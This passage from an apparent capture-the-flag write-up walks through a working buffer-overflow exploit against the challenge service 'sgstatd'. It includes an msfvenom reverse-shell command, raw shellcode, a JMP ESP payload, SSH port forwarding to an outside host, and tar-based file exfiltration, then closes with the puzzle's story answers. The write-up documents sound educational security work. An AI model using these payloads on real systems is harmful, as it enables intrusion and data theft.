The "msg" variable was again changed to represent the recently discovered locations:

{% highlight python %}
    msg = 'A' * 103
    msg += '\xe4\xff\xff\xe4' # Canary
    msg += '1111' # This will be EBP
    msg += '2222' # This will be EIP
    msg += pattern200
{% endhighlight %}

Running this version of ```xpl.py``` against the server showed that EBP and EIP could indeed be controlled remotely, and, this this example, changed to "1111" (```31313131```) and "2222" (```32323232```), respectively:

<figure>
	<a href="/images/2016-01-sans/11n.png"><img src="/images/2016-01-sans/11n.png"></a>
</figure>

Having a closer look at the memory layout at the time of the crash, the ESP register pointed to memory holding the bytes ```41306141```, which, again, translates to the first four characters of the previously sent pattern:

<figure>
	<a href="/images/2016-01-sans/12n.png"><img src="/images/2016-01-sans/12n.png"></a>
</figure>

To summarize; ESP was pointing to the beginning of the pattern. If this pattern was replaced with shellcode, and if EIP could be set to the location of a ```JMP ESP``` instruction, ```sgstatd``` should eventually execute the used shellcode. 

In order to replace the pattern with shellcode, the latter had to be created. After it had been determined that no badchars had to be dealt with, 

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.67 LPORT=16498 -f py
```

was used to create shellcode that would return a reverse shell to the attacking system (192.168.1.67):

```
#    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.67 LPORT=16498 -f py
#	No platform was selected, choosing Msf::Module::Platform::Linux from the payload
#	No Arch selected, selecting Arch: x86 from the payload
#	No encoder or badchars specified, outputting raw payload
#	Payload size: 68 bytes
    buf =  ""
    buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
    buf += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0"
    buf += "\xa8\x01\x43\x68\x02\x00\x40\x72\x89\xe1\xb0\x66\x50"
    buf += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73"
    buf += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
    buf += "\x0b\xcd\x80"
```


With the shellcode created, EIP had to be set to the location of a ```JMP ESP``` instruction. Finding such an instruction required knowing what it looks like in terms of bytes, and Kali's ```nasm_shell.rb``` script is able to help with that:

```
# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > exit
```

```ffe4``` just happened to be part of the canary string ```e4ffffe4```, which ensured that a search for ```ff e4``` within the sgstatd binary would come up with a result:

```
# objdump -d ./sgstatd | grep 'ff e4'
 8049366:	c7 45 fc e4 ff ff e4 	movl   $0xe4ffffe4,-0x4(%ebp)
 80493b2:	81 f2 e4 ff ff e4    	xor    $0xe4ffffe4,%edx
```

With ```ff e4``` being located at both ```0x0804936b``` and ```0x080493b6```, these are the possible values to set EIP to. After adding the newly created shellcode and one of the possible EIP values to ```xpl.py```, the value of the "msg" variable could now be constructed like this:

{% highlight python %}
    buf =  ""
    buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
    buf += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0"
    buf += "\xa8\x01\x43\x68\x02\x00\x40\x72\x89\xe1\xb0\x66\x50"
    buf += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73"
    buf += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
    buf += "\x0b\xcd\x80"
    shellcode = buf   
    
    msg = 'A' * 103
    msg += '\xe4\xff\xff\xe4' # Canary
    msg += '1111' # EBP
    msg += '\x6B\x93\x04\x08' # EIP 0x0804936b (address #1)
    #msg += '\xB6\x93\x04\x08' # EIP 0x080493b6 (address #2, not used)
    msg += shellcode
{% endhighlight %}

After starting an ncat listener and running the latest version of ```xpl.py```, a reverse shell was received:

<figure>
	<a href="/images/2016-01-sans/ncat0.png"><img src="/images/2016-01-sans/ncat0.png"></a>
	<figcaption></figcaption>
</figure>

With the exploit working locally, it was only a matter of changing IP addresses to run the exploit against the SG-5 target. First, ```xpl.py``` was modified to connect to 54.233.105.81 (SG-5) instead of 192.168.1.204 (Server VM). Then, the shellcode had to be changed to connect back to an publicly reachable IP address. I used the IP address [Vodafone Malta](https://www.vodafone.com.mt/) had kindly assigned to my phone, made [Simple Netcat for Android](https://play.google.com/store/apps/details?id=com.github.dddpaul.netcat&hl=en) listen for incoming connections on the specified port, and received something that looked a bit like a reverse shell:


<figure>
	<a href="/images/2016-01-sans/simple-netcat.png"><img src="/images/2016-01-sans/simple-netcat.png"></a>
	<figcaption>The app icon is supposed to portray a sleeping cat, not a shell.</figcaption>
</figure>



In order to receive a proper interactive shell on the attacking system, a temporary system with the publicly reachable IP address 176.221.43.226 was launched. On the attacking system, SSH remote port forwarding was set up:

```ssh -o GatewayPorts=yes -o ServerAliveInterval=60 -N -R 16498:127.0.0.1:16498 176.221.43.226```

After the shellcode had been adjusted to include the IP of the temporary system, ```xpl.py``` was run once more. This resulted in a reverse shell being received by the temporary system and, via SSH, forwarded to the ncat listener on the attacking system:

<figure>
	<a href="/images/2016-01-sans/ncat1.png"><img src="/images/2016-01-sans/ncat1.png"></a>
	<figcaption></figcaption>
</figure>
As can be seen in the screenshot, 

```/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'```

was run immediately after the connection had been established. This was done to get a truly interactive shell and to avoid the termination of the initial reverse shell connection after a few seconds. 

With shell access to the target server, it was now possible to extract its data. All files found in the ```/gnome/www/files``` directory were saved in a tar archive, sent to the temporary system and, just like the reverse shell itself, forwarded to the attacking system: 

<figure>
	<a href="/images/2016-01-sans/out1.png"><img src="/images/2016-01-sans/out1.png"></a>
	<figcaption>Checksum ...</figcaption>
</figure>

<figure>
	<a href="/images/2016-01-sans/out2.png"><img src="/images/2016-01-sans/out2.png"></a>
	<figcaption>... matches!</figcaption>
</figure>

After the received tar file had been extracted, the contents of fifth and last gnome.conf could be viewed:

```
Gnome Serial Number: 4CKL3R43V4
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-05
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
```


## <a id="part5"></a>11. Part 5: Sinister Plot and Attribution

The ZIP files ```20141226101055.zip```, ```20150225093040.zip```, ```20151201113356.zip```, ```20151203133815.zip``` and ```20151215161015.zip```, which were all found on the five SuperGnomes, contained PCAP files. Those, in turn, contained emails describing plot and villain, leading to the following answers:

#### Question 9: Based on evidence you recover from the SuperGnomes’ packet capture ZIP files and any staticky images you find, what is the nefarious plot of ATNAS Corporation?

To use the GIYH device's cameras to aid in the preparation of a large scale burglary series.

#### Question 10: Who is the villain behind the nefarious plot.

Somebody identifying herself as "Cindy Lou Who".

In addition to the incriminating emails, a series of images (```camera_feed_overlap_error.png```, ```factory_cam_1.png```, ```factory_cam_2.png```, ```factory_cam_3.png```, ```factory_cam_4.png```, ```factory_cam_5.png```) had been found on the SuperGnomes. The message exchange on the "GnomeNET" pages on the SuperGnomes' web sites, e.g. <http://52.192.152.132/gnomenet>, suggested that ```camera_feed_overlap_error.png``` had been the result of XOR'ing pixels of the five "factory_cam..." images and a sixth image, which might have shown the "boss' office". 

In order to reveal this image, ```camera_feed_overlap_error.png``` was opened with [paint.net](http://www.getpaint.net/) and layers containing the other five images were placed on top of it. Once their "Blending Mode" had been changed to "Xor", the sixth image, portraying the villain, was revealed:

<figure>
	<a href="/images/2016-01-sans/paintnet.jpg"><img src="/images/2016-01-sans/paintnet.jpg"></a>
	<figcaption>No doubt this could have been done with some CLI tool as well, but... </figcaption>
</figure>

Full image:

<figure>
	<a href="/images/2016-01-sans/xored.jpg"><img src="/images/2016-01-sans/xored.jpg"></a>
</figure>


